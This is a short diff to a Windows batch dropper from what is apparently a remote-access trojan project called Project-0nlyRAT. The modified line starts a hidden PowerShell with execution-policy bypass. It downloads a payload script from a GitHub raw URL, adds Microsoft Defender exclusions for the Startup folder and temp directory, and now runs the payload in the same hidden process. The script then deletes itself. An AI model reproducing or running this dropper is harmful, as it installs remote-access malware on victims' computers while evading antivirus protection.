@@ -37,9 +37,8 @@ REM disable defender
 REM rat resources
 
 REM Download and execute the installer script in an isolated environment, no connection with the parent pwsh
-powershell -noP -ep bypass -w hidden start-process powershell.exe -windowstyle hidden " {iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/2.ps1' -outfile '.\OVlqumatcNr.ps1';Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup';Add-MpPreference -ExclusionPath $env:temp}"
+powershell -noP -ep bypass -w hidden start-process powershell.exe -windowstyle hidden " {iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/2.ps1' -outfile '.\OVlqumatcNr.ps1';Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup';Add-MpPreference -ExclusionPath $env:temp;.\OVlqumatcNr.ps1}"
 
-powershell powershell.exe -noP -ep bypass -w hidden ".\OVlqumatcNr.ps1"
 @REM powershell -ep bypass -noP start-process powershell.exe -windowstyle hidden ".\install.ps1"
 
 del wLMZNyTDPjiugBO.cmd
